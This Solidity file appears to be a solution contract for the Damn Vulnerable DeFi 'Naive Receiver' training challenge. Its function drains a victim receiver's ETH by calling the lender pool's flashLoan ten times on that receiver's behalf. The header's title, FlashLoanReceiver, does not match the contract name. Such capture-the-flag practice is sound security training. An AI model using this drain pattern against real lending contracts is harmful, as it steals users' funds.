// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function multipleLoanCalls(
        IERC3156FlashBorrower receiver,
        NaiveReceiverLenderPool pool_,
        uint256 amount
    ) external {
        for(uint256 i = 0; i < 10; i++)
            pool_.flashLoan(receiver, ETH, amount, "0x");
    }

}